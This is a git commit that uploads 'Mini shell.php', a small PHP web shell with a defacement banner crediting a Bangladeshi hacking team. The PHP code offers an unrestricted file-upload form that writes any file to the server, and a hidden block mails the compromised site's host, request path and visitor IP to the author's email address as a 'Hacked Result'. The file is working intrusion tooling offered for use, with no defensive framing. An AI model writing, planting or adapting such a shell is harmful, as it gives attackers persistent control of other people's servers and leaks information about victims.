87340258c7c797953b212d4fccfa9291a8b7afc8
D1ARK-VA4U3 <86417041+D1ARK-VA4U3@users.noreply.github.com>
2021-07-20 22:53:32 +0600

    Add files via upload

---
+++ Mini shell.php
@@ -0,0 +1,39 @@
+#Shell Gifts by Rh077king
+#We are Bangladeshi hacker'S
+#Don't show you're Attitude
+#We are Bangladeshi
+#MINI shell D1ARK-VA4U3
+<html>
+<head>
+<meta charset="UTF-8"/>
+<link rel="stylesheet"href=""type="text/css"/></head>
+<body>
+
+<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js">
+</script> 
+<body bgcolor="black">
+<center><img src="https://g.top4top.io/p_2027gxa2u0.gif" 
+width="600" height="350"></center>
+<br><br>
+
+<font style="color: #fff; text-shadow: 0px 1px 7px #00fff9;" color="red" face="Iceland" size="6"><b> We Are : </b>
+<marquee scrollamount="10" direction="left" width="70%"><font style="color: #fff; text-shadow: 0px 1px 7px #00fff9;" color="red" face="Iceland" size="5"> <span style="color: lime;"><b> Bangladeshi hacker's:---Team:-Bangladesh cyber Anonymous:--It's me D1ARK-VA4U3 is here</b></marquee>
+<p style="color: #0C8FAB; text-shadow: 0px 0px 1px #000000" align="center">
+<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://vocaroo.com/i/s0VvPO6agEc6&autoplay=1"></iframe><p>
+
+<?php echo '{We Are Second Generation } '.'<br>'.'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="10" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('Upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj077 = " Bangladesh cyber Anonymous Hacked Result |$ip";
+$email = "D1ark.va4u3@gmail.com";
+$from = "From: Result Bangladesh cyber Anonymous";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj077, $msg8873, $from);
+?>
+</body>
+</html>
